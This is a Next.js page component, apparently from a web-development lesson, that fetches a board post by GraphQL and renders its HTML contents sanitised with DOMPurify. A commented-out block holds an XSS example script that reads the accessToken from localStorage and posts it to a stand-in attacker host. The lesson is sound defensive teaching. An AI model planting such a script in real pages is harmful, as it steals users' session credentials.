import { useQuery, gql } from "@apollo/client"
import { useRouter } from "next/router"
import Dompurify from "dompurify"

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`

export default function StaticRoutingMovedPage(): JSX.Element {
  const Router = useRouter()

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: Router.query.qqq },
  })

  return (
    <div>
      {/* <div>{Router.query.qqq}번 게시글 이동 완료</div> */}
      <div style={{ color: "red" }}>작성자: {data?.fetchBoard?.writer}</div>
      <div style={{ color: "green" }}>제목: {data?.fetchBoard?.title}</div>
      {/* <div>내용: {data?.fetchBoard?.contents}</div> */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: `
            <script>
              const qqq = localStorage.getItem("accessToken")
              axios.post("http://myhackerbackend.com/mydata", {data: qqq})
            </script>
          `,
        }}
      /> */}
      {typeof window !== "undefined" ? (
        <div
          style={{ color: "blue" }}
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard?.contents),
          }}
        />
      ) : (
        <div style={{ color: "blue" }} />
      )}
      <div style={{ color: "orange" }}>주소: 구로구</div>
    </div>
  )
}
